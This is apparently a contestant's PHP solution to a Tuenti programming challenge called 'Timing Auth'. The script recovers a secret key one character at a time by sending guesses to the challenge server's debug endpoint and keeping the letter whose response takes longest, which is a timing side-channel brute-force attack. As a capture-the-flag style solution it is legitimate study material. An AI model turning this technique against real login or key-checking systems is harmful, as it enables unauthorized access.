#!/usr/bin/php
<?php
/* Challenge 13 - Tuenti Timing Auth
 * 
 * Diego Villar
 *		Email:		dvil88@gmail.com
 * 		Twitter:	@dvil88
 */

include_once('inc_htmlCurl.php');

$lines = file('php://stdin');
$input = trim(array_shift($lines));

$key = getSecretKey($input);
echo $key,PHP_EOL;

function getSecretKey($input){
	// We have to analyze the time needed to return the result, higher time => correct letter
	$str = '';
	$url = 'http://54.83.207.90:4242/?input='.$input.'&debug=1';
	$letters = 'abcdefghijklmnopqrstuvwxyz0123456789';
	$totalLetters = strlen($letters);
	for($i = 0;$i < 15;$i++){
		$results = array();
		for($letter = 0;$letter < $totalLetters;$letter++){
		
			$key = $str.$letters[$letter];
			$post['post'] = array(
				'key'=>$key,
				'input'=>$input,
			);

			$data = html_petition($url,$post);
			if(!preg_match('/Total run: ([^\\n]+)/ms',$data['pageContent'],$m)){
				if(preg_match('/Oh yeah! Correct key!/ms',$data['pageContent'])){
					return $key;
					break 2;
				}
			}
			// If there's something strange in your neighborhood
			// Who you gonna call? https://www.youtube.com/watch?v=fn7-JZq0Yxs
			$time = number_format($m[1],15);
			$results[$letters[$letter]] = $time;
		}

		arsort($results);
		$selectedKey = key(array_slice($results,0,1,true));
		
		$str .= $selectedKey;
	}
}
?>
